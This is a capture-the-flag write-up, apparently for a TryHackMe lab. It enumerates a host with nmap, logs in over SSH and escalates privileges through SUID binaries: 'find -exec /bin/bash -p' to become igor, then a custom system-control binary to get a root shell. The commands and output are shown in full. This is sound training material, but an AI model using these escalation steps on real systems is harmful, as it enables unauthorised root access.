# SUID Shenanigans

**Date:** 28, May, 2021

**Author:** Dhilip Sanjay S

---

## Enumerating with Nmap

```bash
$ nmap -sC -sV -p- 10.10.1.202 -oN nmap.out
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-28 00:22 IST

Nmap scan report for 10.10.1.202
Host is up (0.15s latency).
Not shown: 65534 closed ports
PORT      STATE SERVICE VERSION
65534/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9e:4e:fe:71:a0:ef:83:03:00:97:4a:c6:c6:a4:0f:93 (RSA)
|   256 a7:d3:9f:bc:bf:62:d0:d3:5d:ea:cb:d3:19:08:6a:9b (ECDSA)
|_  256 ea:40:1b:27:b7:29:1a:5b:ef:f7:bd:05:b1:1d:ec:f0 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 722.51 seconds
```

---

## Login using SSH

- Use the `-p` argument to supply the port:

```bash
$ ssh holly@10.10.1.202 -p 65534
The authenticity of host '[10.10.1.202]:65534 ([10.10.1.202]:65534)' can't be established.
ECDSA key fingerprint is SHA256:IV8SZpN7A1IoTVcTgdDaQ3Edp+lEd77QLtYYI2sesx0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.1.202]:65534' (ECDSA) to the list of known hosts.
holly@10.10.1.202's password: 
    {} _  \
        |__ \
       /_____\
       \o o)\)_______
       (<  ) /#######\
     __{'~` }#########|
    /  {   _}_/########|
   /   {  / _|#/ )####|
  /   \_~/ /_ \  |####|
  \______\/  \ | |####|
   \__________\|/#####|
    |__[X]_____/ \###/ 
    /___________\
     |    |/    |
     |___/ |___/
    _|   /_|   /
   (___,_(___,_)
Last login: Sat Dec  7 22:04:05 2019 from 10.0.0.20
holly@ip-10-10-1-202:~$ whoami
holly
```

---

### What port is SSH running on?
- **Answer:** 65534

---

## Find the binaries with SUID bit set

```bash
$ find / -perm -u=s -exec ls -ldb {} \; 2>/dev/null 
-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 27608 Aug 23  2019 /bin/umount
-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 40128 Mar 26  2019 /bin/su
-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 40152 Aug 23  2019 /bin/mount
-rwsr-xr-x 1 root root 40152 May 15  2019 /snap/core/7396/bin/mount
-rwsr-xr-x 1 root root 44168 May  7  2014 /snap/core/7396/bin/ping
-rwsr-xr-x 1 root root 44680 May  7  2014 /snap/core/7396/bin/ping6
-rwsr-xr-x 1 root root 40128 Mar 25  2019 /snap/core/7396/bin/su
-rwsr-xr-x 1 root root 27608 May 15  2019 /snap/core/7396/bin/umount
-rwsr-xr-x 1 root root 71824 Mar 25  2019 /snap/core/7396/usr/bin/chfn
-rwsr-xr-x 1 root root 40432 Mar 25  2019 /snap/core/7396/usr/bin/chsh
-rwsr-xr-x 1 root root 75304 Mar 25  2019 /snap/core/7396/usr/bin/gpasswd
-rwsr-xr-x 1 root root 39904 Mar 25  2019 /snap/core/7396/usr/bin/newgrp
-rwsr-xr-x 1 root root 54256 Mar 25  2019 /snap/core/7396/usr/bin/passwd
-rwsr-xr-x 1 root root 136808 Jun 10  2019 /snap/core/7396/usr/bin/sudo
-rwsr-xr-- 1 root systemd-network 42992 Jun 10  2019 /snap/core/7396/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 428240 Mar  4  2019 /snap/core/7396/usr/lib/openssh/ssh-keysign
-rwsr-sr-x 1 root root 106696 Jul 12  2019 /snap/core/7396/usr/lib/snapd/snap-confine
-rwsr-xr-- 1 root dip 394984 Jun 12  2018 /snap/core/7396/usr/sbin/pppd
-rwsrwxr-x 1 root root 8880 Dec  7  2019 /usr/bin/system-control
-rwsr-xr-x 1 igor igor 221768 Feb  7  2016 /usr/bin/find
-rwsr-xr-x 1 root root 32944 Mar 26  2019 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 54256 Mar 26  2019 /usr/bin/passwd
-rwsr-xr-x 1 root root 39904 Mar 26  2019 /usr/bin/newgrp
-rwsr-xr-x 1 root root 136808 Jun 10  2019 /usr/bin/sudo
-rwsr-xr-x 1 root root 40432 Mar 26  2019 /usr/bin/chsh
-rwsr-xr-x 1 root root 71824 Mar 26  2019 /usr/bin/chfn
-rwsr-xr-x 1 root root 23376 Mar 27  2019 /usr/bin/pkexec
-rwsr-sr-x 1 daemon daemon 51464 Jan 14  2016 /usr/bin/at
-rwsr-xr-x 1 igor igor 2770528 Mar 31  2016 /usr/bin/nmap
-rwsr-xr-x 1 root root 75304 Mar 26  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 32944 Mar 26  2019 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 14864 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 84120 Apr  9  2019 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-- 1 root messagebus 42992 Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 428240 Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-sr-x 1 root root 106696 Aug 20  2019 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
```

---

### Find and run a file as igor. Read the file /home/igor/flag1.txt
- **Answer:** THM{REDACTED}
- **Steps to Reproduce:** 

```bash
$ find . -exec /bin/bash -p \; -quit
$ pwd
/home/holly
$ cd ..
$ cd igor
$ ls
flag1.txt
$ cat flag1.txt
THM{REDACTED}
```

---

### Find another binary file that has the SUID bit set. Using this file, can you become the root user and read the /root/flag2.txt file?
- **Answer:** THM{REDACTED}
- **Steps to Reproduce:** 

```bash
bash-4.3$ /usr/bin/system-control

===== System Control Binary =====

Enter system command: whoami
root
bash-4.3$ /usr/bin/system-control

===== System Control Binary =====

Enter system command: /bin/bash -p

root@ip-10-10-1-202:/home/igor# cd /root/
root@ip-10-10-1-202:/root# ls
flag2.txt  snap

root@ip-10-10-1-202:/root# cat flag2.txt 
THM{REDACTED}
```



---